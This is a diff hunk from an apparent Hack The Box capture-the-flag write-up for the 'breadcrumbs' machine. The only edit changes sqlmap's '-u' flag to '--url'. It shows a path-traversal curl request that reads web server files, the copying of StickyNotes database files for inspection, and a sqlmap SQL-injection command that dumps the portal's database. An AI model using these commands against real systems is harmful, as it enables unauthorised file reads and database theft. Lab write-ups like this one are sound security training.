@@ -28,7 +28,7 @@ curl -s "http://breadcrumbs.htb/download.php?file=../../../../var/www/html/index
 cp StickyNotes.snt StickyNotes.snt-wal StickyNotes.snt-shm /tmp/
 sqlite3 /tmp/StickyNotes.snt ".tables"
 # UNION SQLi
-sqlmap -u "http://breadcrumbs.htb/portal.php" --data="search=test" --batch --dump
+sqlmap --url "http://breadcrumbs.htb/portal.php" --data="search=test" --batch --dump
 ```
 
 ## Enumeration
